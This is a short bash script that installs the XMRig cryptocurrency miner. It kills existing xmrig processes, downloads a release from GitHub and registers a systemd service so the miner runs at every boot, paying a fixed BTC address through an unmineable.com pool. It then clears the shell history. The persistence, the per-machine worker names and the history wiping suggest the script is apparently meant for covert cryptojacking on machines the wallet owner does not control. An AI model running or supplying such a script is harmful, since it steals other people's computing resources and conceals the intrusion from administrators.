cd /usr/local/bin
killall xmrig
rm -rf xmrig-6.18.1
rm -rf xmrig-6.16.2
mwker=$(TZ='Asia/Tehran' date +'%d-%m_%H')
noCore=$(nproc --all)
usingcore=$((noCore*75/100))
wget https://github.com/xmrig/xmrig/releases/download/v6.19.1/xmrig-6.19.1-linux-x64.tar.gz
tar xvzf xmrig-6.19.1-linux-x64.tar.gz
bash -c 'echo -e "[Unit]\nDescription=XMRig Miner\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/local/bin/xmrig-6.19.1/xmrig -o rx.unmineable.com:3333 -a rx -k -u BTC:bc1qmw5hdlgw0fpc8kwm2ravtdkcfm5aegkdc8k993."'${mwker}_C_${noCore}'" -p 2 -k -a rx/0 --cpu-max-threads-hint=85\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/xmrig.service'
systemctl daemon-reload
systemctl enable xmrig.service
nohup ./xmrig-6.19.1/xmrig -o rx.unmineable.com:3333 -a rx -k -u BTC:bc1qmw5hdlgw0fpc8kwm2ravtdkcfm5aegkdc8k993.${mwker}_C_${noCore} -p 2 -k -a rx/0 --cpu-max-threads-hint=85 &
history -c
